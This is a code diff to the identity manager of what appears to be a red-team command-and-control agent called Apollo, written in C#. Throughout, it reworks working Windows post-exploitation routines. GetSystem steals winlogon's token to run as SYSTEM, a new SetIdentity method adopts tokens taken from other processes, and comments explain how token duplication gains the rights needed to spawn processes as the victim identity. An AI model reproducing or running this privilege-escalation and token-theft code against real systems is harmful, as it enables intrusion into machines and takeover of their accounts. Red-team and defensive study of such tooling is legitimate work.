@@ -9,6 +9,7 @@ using System.Security.Principal;
 using static ApolloInterop.Constants.Win32;
 using static ApolloInterop.Enums.Win32;
 using static ApolloInterop.Structs.Win32;
+using SECURITY_IMPERSONATION_LEVEL = ApolloInterop.Features.WindowsTypesAndAPIs.WinNTTypes.SECURITY_IMPERSONATION_LEVEL;
 
 namespace Apollo.Management.Identity;
 
@@ -50,7 +51,7 @@ public class IdentityManager : IIdentityManager
         IntPtr hToken,
         TokenAccessLevels dwDesiredAccess,
         IntPtr lpTokenAttributes,
-        TokenImpersonationLevel impersonationLevel,
+        SECURITY_IMPERSONATION_LEVEL impersonationLevel,
         TokenType tokenType,
         out IntPtr phNewToken);
 
@@ -208,7 +209,7 @@ public class IdentityManager : IIdentityManager
             hToken,
             TokenAccessLevels.MaximumAllowed,
             IntPtr.Zero,
-            TokenImpersonationLevel.Impersonation,
+            SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
             TokenType.TokenImpersonation,
             out _originalImpersonationToken);
 
@@ -294,53 +295,36 @@ public class IdentityManager : IIdentityManager
             if (GetIntegrityLevel() is not IntegrityLevel.HighIntegrity)
                 return false;
 
-            IntPtr hToken = IntPtr.Zero;
-            IntPtr hDupToken = IntPtr.Zero;
+            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
+            if (processes.Length == 0)
+                return false;
+
+            // TOKEN_DUPLICATE | TOKEN_QUERY is all duplication needs; the copies get full access.
+            if (!_OpenProcessToken(
+                    processes[0].Handle,
+                    (uint)(TokenAccessLevels.Query | TokenAccessLevels.Duplicate),
+                    out IntPtr hToken))
+            {
+                DebugHelp.DebugWriteLine($"[!] GetSystem() - OpenProcessToken failed: {Marshal.GetLastWin32Error()}");
+                return false;
+            }
 
             try
             {
-                System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
-                if (processes.Length == 0)
+                if (!TrySetIdentityInternal(hToken))
                     return false;
-
-                IntPtr handle = processes[0].Handle;
-                bool success = _OpenProcessToken(
-                    handle,
-                    (uint)(TokenAccessLevels.Query | TokenAccessLevels.Duplicate),
-                    out hToken);
-
-                if (!success)
-                {
-                    DebugHelp.DebugWriteLine("[!] GetSystem() - OpenProcessToken failed!");
-                    return false;
-                }
-
-                success = _DuplicateTokenEx(
-                    hToken,
-                    TokenAccessLevels.MaximumAllowed,
-                    IntPtr.Zero,
-                    TokenImpersonationLevel.Impersonation,
-                    TokenType.TokenImpersonation,
-                    out hDupToken);
-
-                if (!success)
-                {
-                    DebugHelp.DebugWriteLine("[!] GetSystem() - DuplicateTokenEx failed!");
-                    return false;
-                }
-
-                DebugHelp.DebugWriteLine("[+] Got SYSTEM token!");
-                SetImpersonationIdentity(hDupToken);
-                SetPrimaryIdentity(hDupToken);
-                return true;
             }
             finally
             {
-                if (hToken != IntPtr.Zero)
-                    _CloseHandle(hToken);
-                if (hDupToken != IntPtr.Zero)
-                    _CloseHandle(hDupToken);
+                _CloseHandle(hToken);
             }
+
+            // Not a full RevertInternal: RunAsSystem restores the caller's identity afterwards and
+            // relies on its loaded profile staying loaded. Stale make_token credentials must still
+            // go, or process creation could fall back to CreateProcessWithLogonW as that user.
+            _userCredential = new ApolloLogonInformation();
+            DebugHelp.DebugWriteLine("[+] Got SYSTEM token!");
+            return true;
         }
     }
 
@@ -448,68 +432,83 @@ public class IdentityManager : IIdentityManager
                 return false;
             }
 
-            _currentPrimaryIdentity = new WindowsIdentity(hToken);
-
-            bRet = _DuplicateTokenEx(
-                _currentPrimaryIdentity.Token,
-                TokenAccessLevels.MaximumAllowed,
-                IntPtr.Zero,
-                TokenImpersonationLevel.Impersonation,
-                TokenType.TokenImpersonation,
-                out IntPtr dupToken);
-
-            if (!bRet)
+            try
+            {
+                if (!TrySetIdentityInternal(hToken))
+                    return false;
+            }
+            finally
             {
                 _CloseHandle(hToken);
-                RevertInternal();
-                return false;
             }
 
-            _currentImpersonationIdentity = new WindowsIdentity(dupToken);
-            _isImpersonating = true;
             _userCredential = logonInfo;
             LoadProfileForIdentity(_currentPrimaryIdentity);
-
-            _CloseHandle(hToken);
-            _CloseHandle(dupToken);
-
             return true;
         }
     }
 
-    public void SetPrimaryIdentity(WindowsIdentity ident)
+    // Takes on the identity of an existing token (e.g. one stolen from another process).
+    // Like make_token, this first reverts, which also clears any stored credentials and loaded
+    // profile, and ensures the copies are made (and given their default DACL) as ourselves.
+    public bool SetIdentity(IntPtr hToken)
     {
         lock (_identitySync)
         {
-            _currentPrimaryIdentity = ident;
-            _isImpersonating = true;
+            RevertInternal();
+            return TrySetIdentityInternal(hToken);
         }
     }
 
-    public void SetPrimaryIdentity(IntPtr hToken)
+    // Points both identities at copies of hToken: a primary token, which process creation
+    // (CreateProcessAsUser/CreateProcessWithTokenW) requires, and an impersonation token for
+    // the agent's threads. Leaves the current identities unchanged on failure.
+    private bool TrySetIdentityInternal(IntPtr hToken)
     {
-        lock (_identitySync)
+        WindowsIdentity? primary = DuplicateIdentity(hToken, TokenType.TokenPrimary);
+        if (primary == null)
+            return false;
+
+        WindowsIdentity? impersonation = DuplicateIdentity(hToken, TokenType.TokenImpersonation);
+        if (impersonation == null)
         {
-            _currentPrimaryIdentity = new WindowsIdentity(hToken);
-            _isImpersonating = true;
+            primary.Dispose();
+            return false;
         }
+
+        _currentPrimaryIdentity = primary;
+        _currentImpersonationIdentity = impersonation;
+        _isImpersonating = true;
+        return true;
     }
 
-    public void SetImpersonationIdentity(WindowsIdentity ident)
+    private WindowsIdentity? DuplicateIdentity(IntPtr hToken, TokenType tokenType)
     {
-        lock (_identitySync)
+        // With null token attributes the copy gets a default security descriptor from the
+        // caller's token, so MAXIMUM_ALLOWED grants full access however little access hToken
+        // was opened with - including the TOKEN_ADJUST_DEFAULT/TOKEN_ADJUST_SESSIONID that
+        // process creation needs. The level must be the native SECURITY_IMPERSONATION_LEVEL:
+        // .NET's TokenImpersonationLevel has a leading None = 0 and is off by one.
+        if (!_DuplicateTokenEx(
+                hToken,
+                TokenAccessLevels.MaximumAllowed,
+                IntPtr.Zero,
+                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                tokenType,
+                out IntPtr hDupToken))
         {
-            _currentImpersonationIdentity = ident;
-            _isImpersonating = true;
+            DebugHelp.DebugWriteLine($"[!] DuplicateTokenEx({tokenType}) failed: {Marshal.GetLastWin32Error()}");
+            return null;
         }
-    }
 
-    public void SetImpersonationIdentity(IntPtr hToken)
-    {
-        lock (_identitySync)
+        // WindowsIdentity keeps its own duplicate of the handle, so ours is always closed.
+        try
         {
-            _currentImpersonationIdentity = new WindowsIdentity(hToken);
-            _isImpersonating = true;
+            return new WindowsIdentity(hDupToken);
+        }
+        finally
+        {
+            _CloseHandle(hDupToken);
         }
     }
 
